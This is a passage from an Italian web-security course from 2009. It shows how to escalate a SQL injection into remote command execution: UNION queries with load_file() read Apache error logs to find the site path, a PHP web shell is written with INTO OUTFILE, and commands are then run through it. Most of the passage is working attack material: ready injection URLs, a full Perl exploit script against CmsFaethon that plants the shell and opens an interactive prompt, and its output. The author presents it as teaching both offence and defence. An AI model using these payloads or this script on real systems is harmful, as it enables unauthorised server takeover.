stripslashes è una funzione di PHP che permette di eliminare da una stringa i caratteri di escape `\` che precedono caratteri sensibili come l'apice `'`, i doppi apici `"`, il backslash `\` ed il byte di NULL.

Un altro problema legato a questa tecnica, è l'individuazione della path del sito nel server. Se infatti vogliamo ottenere una shell sul sito, dobbiamo conoscere la path di questo nel WebServer, così da inserirla nell'
`OUTFILE`.

A volte per trovare la path, basta cercar di generare qualche errore SQL nell'applicazione. Se infatti questa, in caso di errore, lo stampa a schermo, in moltissimi casi si riuscirà a visualizzare la path del sito nel server.

Per generare un errore, si può provare a inserire un ` ' ` nelle query SQL, e vedere cosa succede.
Essendo questa una grande limitazione, ho trovato un nuovo modo per trovare la path del sito nel server, particolare di vitale importanza per l'esecuzione della tecnica.

In aiuto ci viene la funzione dell'SQL `load_file()`. Questa funzione infatti ci permette di caricare un file, per leggerne il contenuto. Da non confondersi con un include, l'include infatti anche esegue il file, il `load_file` carica solo il contenuto del file, non lo esegue.

Ora iniziamo ad addentrarci nella vera e propria tecnica. Apache, contine dei file di log. File dove vengono registrati errori, le varie richieste GET POST e via dicendo. Facendo una richiesta GET ad esempio ad un file che non esiste nel server, nel file di log degli errori di apache apparirà l'errore, con la path del relativo file di cui abbiam fatto la richiesta, andiamo a vedere:
`GET sdjdskjsddskj.php`

Andando a vedere il file di log degli errori, vedremo una cosa di questo tipo: 
`File does not exist: /path/nome_del_file_richiesto`

Quindi, con una query GET a localhost di questo tipo: `localhost/sdjdskjsddskj.php`
poichè il file non esiste, nel file di log degli errori apparirà questo messaggio:
`File does not exist: /home/osirys/web/sdjdskjsddskj.php`

`/home/osirys/web/` è la path del sito nel webserver.

Usando ora il `load_file` nella sql injection, caricando il file degli errori, con una regexp quindi riusciremo a ottenere la path del sito. Poichè la path non è universale, si proverà a tentativi, ovvero dopo aver generato l'errore, si proverà a includere con il `load_file` tutte le possibili path del file di log degli errori, fino a quando non si troverà il nome del file non esistente richiesto, quindi alla sua sinistra troveremo la path.

Vediamo un esempio di SQL Injection, con l'uso del load_file.

`http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/httpd/error_log"),4`

La query manipolata sarà dunque: `1 and 1=2 union select 1,2,load_file("/var/log/httpd/error_log"),4`

Verranno quindi selezionate 4 colonne, nella terza verrà caricato il file `/var/log/httpd/error_log`, quindi, se questo esiste davvero, verrà mostrato il suo contenuto. Poichè come ho già detto le path del file degli errori di apache possono cambiare, si andrà avanti a tentavi, le possibili path sono:
- /var/log/httpd/error.log
- /var/log/httpd/error_log
- /var/log/apache/error.log
- /var/log/apache/error_log
- /var/log/apache2/error.log
- /var/log/apache2/error_log
- /logs/error.log
- /var/log/apache/error_log
- /var/log/apache/error.log
- /usr/local/apache/logs/error_log
- /etc/httpd/logs/error_log
- /etc/httpd/logs/error.log
- /var/www/logs/error_log
- /var/www/logs/error.log
- /usr/local/apache/logs/error.log
- /var/log/error_log
- /apache/logs/error.log

Le query usate saranno dunque:

- `http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/httpd/error.log"),4`
- `http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/httpd/error_log"),4`
- `http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/apache/error.log"),4`
- `http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/apache/error_log"),4`
- `http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/apache2/error.log"),4`
- `http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,load_file("/var/log/apache2/error_log"),4`


E così via dicendo..

Si continuerà dunque fino a quando non verrà stampato a schermo il contenuto del file caricato, si andrà dunque a cercare l'errore che ci mostrerà la path.

Troveremo: `File does not exist: /home/osirys/web/sdjdskjsddskj.php`

La path quindi è: `/home/osirys/web/`

Ora che abbiamo la path, possiamo procedere creando il file vulnerabile a RCE, che ci garantirà l'esecuzione di comandi arbitrari.

La prossima query sarà quindi:

`http://sito.it/dir/file.php?var=1 and 1=2 union select 1,2,'<?php system($_GET[cmd]); ?>',4 into outfile '/home/osirys/web/shell.php'`

A questo punto basterà usare la seguente query per eseguire comandi:
`http://sito.it/shell.php?cmd=comando`

Se il server sarà Linux, si eseguiranno comandi della shell Bash, ad esempio: `http://sito.it/shell.php?cmd=uname -a`

Se il server sarà Windows, si eseguiranno comandi del prompt dei comandi di casa Microsoft, ad esempio: `http://sito.it/shell.php?cmd=dir`


Per semplificare questo lavoro, ho scritto uno script che esegue questa tecnica, basta dunque inserirvi la query di SQL Injection, e lo script troverà da solo la path, e farà il resto.

```perl
#!/usr/bin/perl

# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------------------------------------------|
#  osirys[~]>$ perl p0w.txt http://localhost/cmsfaethon-2.0.4-ultimate/20_ultimate/
#
#   ---------------------------------
#         CmsFaethon Remote SQL
#             CMD Inj Sploit
#               by Osirys
#   ---------------------------------
#
# [*] Generating error through GET request ..
# [*] Cheeking Apache Error Log path ..
# [*] Error Log path found -> /var/log/httpd/error_log
# [*] Website path found -> /home/osirys/web/cmsfaethon-2.0.4-ultimate/20_ultimate/
# [*] Shell succesfully injected !
# [&] Hi my master, do your job now [!]

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/cmsfaethon-2.0.4-ultimate/20_ultimate
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|


use IO::Socket;
use LWP::UserAgent;

my $host = $ARGV[0];
my $rand = int(rand 9) +1;

my @error_logs  =  qw(
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/apache/error.log
                      /var/log/apache/error_log
                      /var/log/apache2/error.log
                      /var/log/apache2/error_log
                      /logs/error.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                    );

my $php_c0de   =  "<?php echo \"st4rt\";if(get_magic_quotes_gpc()){ \$_GET".
                  "[cmd]=stripslashes(\$_GET[cmd]);}system(\$_GET[cmd]);?>";

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Generating error through GET request ..\n";

get_req($host."/osirys_log_test".$rand);

print "[*] Cheeking Apache Error Log path ..\n";

while (($log = <@error_logs>)&&($gotcha != 1)) {
    $tmp_path = $host."/info.php?item=-2' union all select load_file('".$log."'),0 order by '*";
    $re = get_req($tmp_path);
    if ($re =~ /File does not exist: (.+)\/osirys_log_test$rand/) {
        $site_path = $1."/";
        $gotcha = 1;
        print "[*] Error Log path found -> $log\n";
        print "[*] Website path found -> $site_path\n";
        &inj_shell;
    }
}

$gotcha == 1 || die "[-] Couldn't file error_log !\n";

sub inj_shell {
    my $attack  = $host."/info.php?item=-2' union all select '".$php_c0de."',0 into dumpfile '".$site_path."/1337.php";
    get_req($attack);
    my $test = get_req($host."/1337.php");
    if ($test =~ /st4rt/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        &exec_cmd;

    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $host."/1337.php?cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /st4rt(.+)0/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "           From SQL to RCE          \n".
          "            CMD Inj Sploit          \n".
          "              by Osirys             \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}
```

Vediamo l'output di questo exploit.

```
osirys[~]>$ perl p0w.txt http://localhost/test/

  ---------------------------------
        CmsFaethon Remote SQL
            CMD Inj Sploit
              by Osirys
  ---------------------------------

[*] Generating error through GET request ..
[*] Cheeking Apache Error Log path ..
[*] Error Log path found -> /var/log/httpd/error_log
[*] Website path found -> /home/osirys/web/test/
[*] Shell succesfully injected !
[&] Hi my master, do your job now [!]

shell[localhost]$> id
uid=80(apache) gid=80(apache) groups=80(apache)
shell[localhost]$> pwd
/home/osirys/web/test
shell[localhost]$> exit
[-] Quitting ..
osirys[~]>$
```

Come possiamo vedere, l'exploit ha generato la richiesta ad una pagina non esistente sul server, poi con il load_file delle possibili path dei log di apache, ha trovato la path del sito nel server, per poi creare una shell sul sito e regalare molto generosamente una shell all'attacker.

# Conclusione
Questo corso e' stato scritto tenendo a mente sia l'Offensive side e il Defensive side. Senza conoscere varie techniche di exploitation e' difficile per un programmatore imparare a scrivere codice sicuro. Allo stesso tempo, e' difficile per un aspirante hacker a migliorare senza aver propria conoscenza dei linguaggi web, database e web servers.

L'autore spera che il corso sia stato di gradimento.

Giovanni, "Osirys"
Gennaio 2009

